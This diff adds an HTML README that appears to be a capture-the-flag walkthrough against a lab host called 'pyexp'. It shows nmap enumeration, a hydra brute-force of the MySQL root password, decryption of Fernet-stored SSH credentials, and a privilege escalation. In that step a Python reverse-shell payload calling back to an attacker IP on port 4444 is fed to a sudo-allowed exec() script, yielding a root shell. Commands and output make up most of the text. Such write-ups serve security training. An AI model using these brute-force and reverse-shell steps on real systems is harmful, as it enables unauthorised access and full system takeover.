@@ -1,0 +1,142 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body>IP - 192.168.103.118<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+Nmap scan report for 192.168.103.118<br/>
+Host is up (0.21s latency).<br/>
+Not shown: 65533 closed tcp ports (reset)<br/>
+PORT &nbsp; &nbsp; STATE SERVICE VERSION<br/>
+1337/tcp open &nbsp;ssh &nbsp; &nbsp; OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+| &nbsp; 2048 f7af6cd12694dce51a221a644e1c34a9 (RSA)<br/>
+| &nbsp; 256 46d28dbd2f9eafcee2455ca612c0d919 (ECDSA)<br/>
+|_ &nbsp;256 8d11edff7dc5a72499227fce2988b24a (ED25519)<br/>
+3306/tcp open &nbsp;mysql &nbsp; MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1<br/>
+| mysql-info: <br/>
+| &nbsp; Protocol: 10<br/>
+| &nbsp; Version: 5.5.5-10.3.23-MariaDB-0+deb10u1<br/>
+| &nbsp; Thread ID: 740<br/>
+| &nbsp; Capabilities flags: 63486<br/>
+| &nbsp; Some Capabilities: Support41Auth, FoundRows, ConnectWithDatabase, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsLoadDataLocal, Speaks41ProtocolNew, ODBCClient, SupportsCompression, IgnoreSigpipes, InteractiveClient, SupportsTransactions, IgnoreSpaceBeforeParenthesis, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults<br/>
+| &nbsp; Status: Autocommit<br/>
+| &nbsp; Salt: QXE1d'2f,G_*P4S%[}$7<br/>
+|_ &nbsp;Auth Plugin Name: mysql_native_password<br/>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 307.81 seconds<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 192.168.103.118<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 19:12 +0630<br/>
+Stats: 0:06:14 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan<br/>
+NSE Timing: About 98.41% done; ETC: 19:19 (0:00:06 remaining)<br/>
+Stats: 0:10:23 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan<br/>
+NSE Timing: About 98.41% done; ETC: 19:23 (0:00:10 remaining)<br/>
+Stats: 0:14:18 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan<br/>
+NSE Timing: About 98.41% done; ETC: 19:27 (0:00:14 remaining)<br/>
+Nmap scan report for 192.168.103.118<br/>
+Host is up (0.21s latency).<br/>
+<br/>
+PORT &nbsp; &nbsp; STATE SERVICE VERSION<br/>
+3306/tcp open &nbsp;mysql &nbsp; MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1<br/>
+| mysql-enum: <br/>
+| &nbsp; Valid usernames: <br/>
+| &nbsp; &nbsp; root:&lt;empty&gt; - Valid credentials<br/>
+| &nbsp; &nbsp; netadmin:&lt;empty&gt; - Valid credentials<br/>
+| &nbsp; &nbsp; guest:&lt;empty&gt; - Valid credentials<br/>
+| &nbsp; &nbsp; user:&lt;empty&gt; - Valid credentials<br/>
+| &nbsp; &nbsp; web:&lt;empty&gt; - Valid credentials<br/>
+| &nbsp; &nbsp; sysadmin:&lt;empty&gt; - Valid credentials<br/>
+| &nbsp; &nbsp; administrator:&lt;empty&gt; - Valid credentials<br/>
+| &nbsp; &nbsp; webadmin:&lt;empty&gt; - Valid credentials<br/>
+| &nbsp; &nbsp; admin:&lt;empty&gt; - Valid credentials<br/>
+| &nbsp; &nbsp; test:&lt;empty&gt; - Valid credentials<br/>
+|_ &nbsp;Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0<br/>
+| mysql-info: <br/>
+| &nbsp; Protocol: 10<br/>
+| &nbsp; Version: 5.5.5-10.3.23-MariaDB-0+deb10u1<br/>
+| &nbsp; Thread ID: 2578<br/>
+| &nbsp; Capabilities flags: 63486<br/>
+| &nbsp; Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, ODBCClient, LongColumnFlag, SupportsCompression, InteractiveClient, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, FoundRows, IgnoreSigpipes, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults<br/>
+| &nbsp; Status: Autocommit<br/>
+| &nbsp; Salt: K4^];KF`/h&gt;&gt;Z.rutg)5<br/>
+|_ &nbsp;Auth Plugin Name: mysql_native_password<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 972.33 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Bruteforce mysql with hydra:<br/>
+<br/>
+hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.103.118 mysql<br/>
+<br/>
+I wait awhile and got root's password "prettywoman"<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+I got "fernet" encryption code so I decrypt it with this website https://asecuritysite.com/encryption/ferdecode<br/>
+<br/>
+MariaDB [data]&gt; select * from fernet;<br/>
++--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+<br/>
+| cred &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | keyy &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |<br/>
++--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+<br/>
+| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |<br/>
++--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+<br/>
+1 row in set (0.206 sec)<br/>
+<br/>
+I got ssh username and password from fernet decryption:<br/>
+<br/>
+username - lucy<br/>
+password - wJ9`"Lemdv9[FEw-<br/>
+<br/>
+<br/>
+lucy@pyexp:~$ cat local.txt <br/>
+8775888e45fff5de6fa5c529fba535b4<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Privilege Escalation (sudo -l /usr/bin/python2 /opt/exp.py)<br/>
+<br/>
+I found that I can run /usr/bin/python2 /opt/exp.py without root password and I found that python program source code using exec() function so I read this article for how this exec() work (https://blog.finxter.com/python-exec/) <br/>
+<br/>
+After I understand how it is work, I use python reverse shell for root access with this payload:<br/>
+<br/>
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.103",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")<br/>
+<br/>
+<br/>
+lucy@pyexp:/opt$ sudo /usr/bin/python2 /opt/exp.py<br/>
+how are you?import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.103",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nc -lvnp 4444 &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+listening on [any] 4444 ...<br/>
+connect to [192.168.49.103] from (UNKNOWN) [192.168.103.118] 53738<br/>
+# whoami<br/>
+whoami<br/>
+root<br/>
+# cd /root<br/>
+cd /root<br/>
+# ls -la<br/>
+ls -la<br/>
+total 24<br/>
+drwx------ &nbsp;2 root root 4096 Mar &nbsp;4 08:40 .<br/>
+drwxr-xr-x 18 root root 4096 Oct 19 &nbsp;2020 ..<br/>
+-rw------- &nbsp;1 root root &nbsp; &nbsp;0 Nov 19 &nbsp;2020 .bash_history<br/>
+-rw-r--r-- &nbsp;1 root root &nbsp;570 Jan 31 &nbsp;2010 .bashrc<br/>
+-rw-r--r-- &nbsp;1 root root &nbsp;148 Aug 17 &nbsp;2015 .profile<br/>
+-rw------- &nbsp;1 root root &nbsp; 33 Mar &nbsp;4 08:40 proof.txt<br/>
+-rw-r--r-- &nbsp;1 root root &nbsp; 32 Nov 19 &nbsp;2020 root.txt<br/>
+# cat proof.txt<br/>
+cat proof.txt<br/>
+a31824dffac0f221b6b7c8d520523f18<br/>
+# </body></html>
